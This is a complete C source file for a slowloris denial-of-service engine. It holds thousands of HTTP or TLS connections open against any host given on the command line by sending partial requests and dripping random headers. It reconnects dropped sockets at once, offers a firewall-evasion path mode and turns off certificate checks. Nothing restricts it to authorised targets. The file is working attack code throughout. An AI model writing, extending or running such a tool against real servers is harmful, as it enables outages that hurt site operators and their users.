/*
 * slowloris — socket-holding engine. Opens connections, sends a partial
 * request, then drips one header every --interval-ms for the whole duration.
 * The server keeps a worker thread and a half-parsed request per socket until
 * its header timeout expires, which is the exhaustion vector.
 *
 * Connections are spread over --threads event loops. Dead sockets reconnect
 * immediately so the held-socket count stays flat instead of decaying.
 *
 * Needs root only when --ulimit raise is required; sockets themselves are
 * ordinary TCP. --tls holds TLS sessions instead.
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <openssl/ssl.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#include "waf.h"

#define HARD_MAX_SOCKETS    200000
#define HARD_MAX_THREADS    512
#define HARD_MAX_DURATION_S 1200
#define MAX_PER_THREAD      1024
#define CONNECT_TIMEOUT_MS  4000

typedef struct {
    char host[256];
    char path[512];
    int port, duration_s, threads, sockets, interval_ms, tls, waf;
} cfg_t;

typedef struct {
    int fd;
    SSL *ssl;
    uint64_t age;
} slot_t;

typedef struct {
    const cfg_t *cfg;
    int id;
    pthread_t tid;
    slot_t *slots;
    int n;
    uint64_t rng;
    uint64_t opened, errors, held;
    waf_t waf;
} ctx_t;

static atomic_int g_stop;
static double g_start_s;
static ctx_t *g_ctxs;
static int g_nctx;
static struct sockaddr_in g_dst;
static SSL_CTX *g_ssl;
static char g_sni[256];

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}
static double now_s(void) { return (double)now_ns() / 1e9; }
static void on_sigint(int s) { (void)s; atomic_store(&g_stop, 1); }

static int wait_fd(int fd, int wr, int ms) {
    fd_set s; FD_ZERO(&s); FD_SET(fd, &s);
    struct timeval tv = { ms / 1000, (ms % 1000) * 1000 };
    return select(fd + 1, wr ? NULL : &s, wr ? &s : NULL, NULL, &tv);
}

static int dial(void) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    int fl = fcntl(fd, F_GETFL, 0);
    if (fl < 0 || fcntl(fd, F_SETFL, fl | O_NONBLOCK) < 0) { close(fd); return -1; }
    int rc = connect(fd, (struct sockaddr *)&g_dst, sizeof(g_dst));
    if (rc != 0 && errno != EINPROGRESS) { close(fd); return -1; }
    if (rc != 0) {
        if (wait_fd(fd, 1, CONNECT_TIMEOUT_MS) <= 0) { close(fd); return -1; }
        int e = 0; socklen_t el = sizeof(e);
        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &e, &el) != 0 || e) { close(fd); return -1; }
    }
    fcntl(fd, F_SETFL, fl);
    return fd;
}

static int send_all(int fd, SSL *ssl, const char *buf, size_t len) {
    size_t left = len;
    const char *p = buf;
    while (left) {
        int n = ssl ? SSL_write(ssl, p, (int)left) : (int)send(fd, p, left, MSG_NOSIGNAL);
        if (n <= 0) return -1;
        p += n; left -= (size_t)n;
    }
    return 0;
}

static void slot_close(slot_t *s) {
    if (s->ssl) { SSL_free(s->ssl); s->ssl = NULL; }
    if (s->fd >= 0) { close(s->fd); s->fd = -1; }
}

/* Partial request: request line and a couple of headers, no terminator. */
static int slot_open(ctx_t *c, slot_t *s) {
    const cfg_t *cfg = c->cfg;
    int fd = dial();
    if (fd < 0) return -1;

    SSL *ssl = NULL;
    if (cfg->tls) {
        ssl = SSL_new(g_ssl);
        if (!ssl) { close(fd); return -1; }
        SSL_set_fd(ssl, fd);
        if (g_sni[0]) SSL_set_tlsext_host_name(ssl, g_sni);
        SSL_set_connect_state(ssl);
        int ok = 0;
        for (int i = 0; i < 200; i++) {
            int r = SSL_connect(ssl);
            if (r == 1) { ok = 1; break; }
            int e = SSL_get_error(ssl, r);
            if (e == SSL_ERROR_WANT_READ) { if (wait_fd(fd, 0, 500) <= 0) break; }
            else if (e == SSL_ERROR_WANT_WRITE) { if (wait_fd(fd, 1, 500) <= 0) break; }
            else break;
        }
        if (!ok) { SSL_free(ssl); close(fd); return -1; }
    }

    char req[1024];
    char path[640];
    if (cfg->waf) waf_build_path(&c->waf, cfg->path, path, sizeof(path));
    else snprintf(path, sizeof(path), "%s", cfg->path);

    int n = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: hackit-slowloris/1.0\r\n"
        "Accept: text/html,*/*\r\nAccept-Language: en-US,en;q=0.9\r\n",
        path, cfg->host);
    if (n < 0 || send_all(fd, ssl, req, (size_t)n) != 0) {
        if (ssl) SSL_free(ssl);
        close(fd);
        return -1;
    }
    s->fd = fd;
    s->ssl = ssl;
    s->age = 0;
    return 0;
}

static void *worker(void *arg) {
    ctx_t *c = arg;
    const cfg_t *cfg = c->cfg;
    double deadline = g_start_s + (double)cfg->duration_s;

    for (int i = 0; i < c->n; i++) {
        if (slot_open(c, &c->slots[i]) == 0) c->opened++;
        else c->errors++;
    }

    while (!atomic_load(&g_stop) && now_s() < deadline) {
        struct timespec ts = { cfg->interval_ms / 1000,
                               (long)(cfg->interval_ms % 1000) * 1000000L };
        nanosleep(&ts, NULL);
        if (atomic_load(&g_stop)) break;

        for (int i = 0; i < c->n; i++) {
            slot_t *s = &c->slots[i];
            if (s->fd < 0) {
                if (slot_open(c, s) == 0) c->opened++; else c->errors++;
                continue;
            }
            char line[96];
            char tag[12];
            waf_rand_str(&c->waf, tag, 8);
            int n = snprintf(line, sizeof(line), "X-%s: %s\r\n", tag, tag);
            if (send_all(s->fd, s->ssl, line, (size_t)n) != 0) {
                slot_close(s);
                c->errors++;
                if (slot_open(c, s) == 0) c->opened++;
            } else {
                s->age++;
            }
        }
    }

    for (int i = 0; i < c->n; i++) slot_close(&c->slots[i]);
    return NULL;
}

static void *monitor(void *arg) {
    int ms = *(int *)arg;
    while (!atomic_load(&g_stop)) {
        struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
        nanosleep(&ts, NULL);
        if (atomic_load(&g_stop)) break;
        double el = now_s() - g_start_s;
        if (el <= 0) continue;
        uint64_t held = 0, op = 0, er = 0;
        for (int i = 0; i < g_nctx; i++) {
            op += g_ctxs[i].opened; er += g_ctxs[i].errors;
            for (int k = 0; k < g_ctxs[i].n; k++) if (g_ctxs[i].slots[k].fd >= 0) held++;
        }
        printf("{\"type\":\"progress\",\"elapsed_s\":%.3f,\"requests\":%llu,\"ok\":%llu,"
               "\"errors\":%llu,\"achieved_rps\":%.2f,\"held\":%llu}\n",
               el, (unsigned long long)op, (unsigned long long)held,
               (unsigned long long)er, (double)op / el, (unsigned long long)held);
        fflush(stdout);
    }
    return NULL;
}

static void usage(const char *p) {
    fprintf(stderr, "usage: %s <host> [port] [opts]\n"
      "  --duration N --sockets N --threads N --interval-ms N --path P --tls --waf\n"
      "  duration 1-%d, sockets 1-%d, threads 1-%d\n",
      p, HARD_MAX_DURATION_S, HARD_MAX_SOCKETS, HARD_MAX_THREADS);
}

int main(int argc, char **argv) {
    if (argc < 2) { usage(argv[0]); return 2; }
    cfg_t cfg; memset(&cfg, 0, sizeof(cfg));
    snprintf(cfg.host, sizeof(cfg.host), "%s", argv[1]);
    cfg.port = 80; cfg.duration_s = 60; cfg.sockets = 1000;
    cfg.threads = 64; cfg.interval_ms = 8000;
    snprintf(cfg.path, sizeof(cfg.path), "/");

    int i0 = 2;
    if (argc > 2 && argv[2][0] != '-') { cfg.port = atoi(argv[2]); i0 = 3; }

    for (int i = i0; i < argc; i++) {
        if (!strcmp(argv[i], "--duration") && i + 1 < argc) cfg.duration_s = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--sockets") && i + 1 < argc) cfg.sockets = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads") && i + 1 < argc) cfg.threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--interval-ms") && i + 1 < argc) cfg.interval_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--path") && i + 1 < argc) snprintf(cfg.path, sizeof(cfg.path), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--tls")) cfg.tls = 1;
        else if (!strcmp(argv[i], "--waf")) cfg.waf = 1;
        else { usage(argv[0]); return 2; }
    }

    if (cfg.port == 443) cfg.tls = 1;
    if (cfg.duration_s < 1) cfg.duration_s = 1;
    if (cfg.duration_s > HARD_MAX_DURATION_S) cfg.duration_s = HARD_MAX_DURATION_S;
    if (cfg.sockets < 1) cfg.sockets = 1;
    if (cfg.sockets > HARD_MAX_SOCKETS) cfg.sockets = HARD_MAX_SOCKETS;
    if (cfg.threads < 1) cfg.threads = 1;
    if (cfg.threads > HARD_MAX_THREADS) cfg.threads = HARD_MAX_THREADS;
    if (cfg.threads > cfg.sockets) cfg.threads = cfg.sockets;
    if (cfg.interval_ms < 100) cfg.interval_ms = 100;

    struct addrinfo h = {0}, *r = NULL;
    char svc[8];
    h.ai_family = AF_INET; h.ai_socktype = SOCK_STREAM;
    snprintf(svc, sizeof(svc), "%d", cfg.port);
    if (getaddrinfo(cfg.host, svc, &h, &r) != 0) {
        fprintf(stderr, "slowloris: cannot resolve %s\n", cfg.host); return 2;
    }
    memcpy(&g_dst, r->ai_addr, sizeof(struct sockaddr_in));
    freeaddrinfo(r);

    if (cfg.tls) {
        snprintf(g_sni, sizeof(g_sni), "%s", cfg.host);
        OPENSSL_init_ssl(0, NULL);
        g_ssl = SSL_CTX_new(TLS_client_method());
        if (!g_ssl) { fprintf(stderr, "slowloris: TLS context failed\n"); return 1; }
        SSL_CTX_set_min_proto_version(g_ssl, TLS1_2_VERSION);
        SSL_CTX_set_verify(g_ssl, SSL_VERIFY_NONE, NULL);
    }

    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_sigint;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    g_start_s = now_s();
    g_nctx = cfg.threads;
    g_ctxs = calloc((size_t)g_nctx, sizeof(ctx_t));
    if (!g_ctxs) { fprintf(stderr, "slowloris: out of memory\n"); return 1; }

    int base = cfg.sockets / cfg.threads;
    int extra = cfg.sockets % cfg.threads;
    for (int i = 0; i < g_nctx; i++) {
        ctx_t *c = &g_ctxs[i];
        c->cfg = &cfg;
        c->id = i;
        c->n = base + (i < extra ? 1 : 0);
        if (c->n > MAX_PER_THREAD) c->n = MAX_PER_THREAD;
        c->rng = (uint64_t)now_ns() ^ ((uint64_t)(i + 1) * 0x9E3779B97F4A7C15ull);
        waf_init(&c->waf, cfg.waf, c->rng);
        c->slots = calloc((size_t)c->n, sizeof(slot_t));
        if (!c->slots) { fprintf(stderr, "slowloris: out of memory\n"); return 1; }
        for (int k = 0; k < c->n; k++) c->slots[k].fd = -1;
    }

    pthread_t mon; bool mst = false;
    if (pthread_create(&mon, NULL, monitor, &(int){500}) == 0) mst = true;
    for (int i = 0; i < g_nctx; i++)
        if (pthread_create(&g_ctxs[i].tid, NULL, worker, &g_ctxs[i]) != 0) {
            atomic_store(&g_stop, 1);
            fprintf(stderr, "slowloris: pthread_create failed\n"); return 1;
        }
    for (int i = 0; i < g_nctx; i++) pthread_join(g_ctxs[i].tid, NULL);
    atomic_store(&g_stop, 1);
    if (mst) pthread_join(mon, NULL);

    double el = now_s() - g_start_s;
    if (el <= 0) el = 1e-6;
    uint64_t op = 0, er = 0;
    for (int i = 0; i < g_nctx; i++) { op += g_ctxs[i].opened; er += g_ctxs[i].errors; }

    printf("{\"type\":\"result\",\"engine\":\"slowloris\",\"mode\":\"slowloris\","
           "\"target\":\"%s:%d\",\"method\":\"SLOW\",\"duration_s\":%.3f,\"requests\":%llu,"
           "\"ok\":%llu,\"errors\":%llu,\"achieved_rps\":%.2f,\"error_rate\":%.4f,"
           "\"sockets\":%d,\"interval_ms\":%d,\"tls\":%s,\"waf\":%s,"
           "\"latency_ms\":{\"p50\":0,\"p90\":0,\"p99\":0,\"max\":0},"
           "\"note\":\"ok counts connections opened, not responses\"}\n",
           cfg.host, cfg.port, el, (unsigned long long)op, (unsigned long long)op,
           (unsigned long long)er, (double)op / el,
           op ? (double)er / (double)op : 0.0, cfg.sockets, cfg.interval_ms,
           cfg.tls ? "true" : "false", cfg.waf ? "true" : "false");

    for (int i = 0; i < g_nctx; i++) free(g_ctxs[i].slots);
    free(g_ctxs);
    if (g_ssl) SSL_CTX_free(g_ssl);
    return 0;
}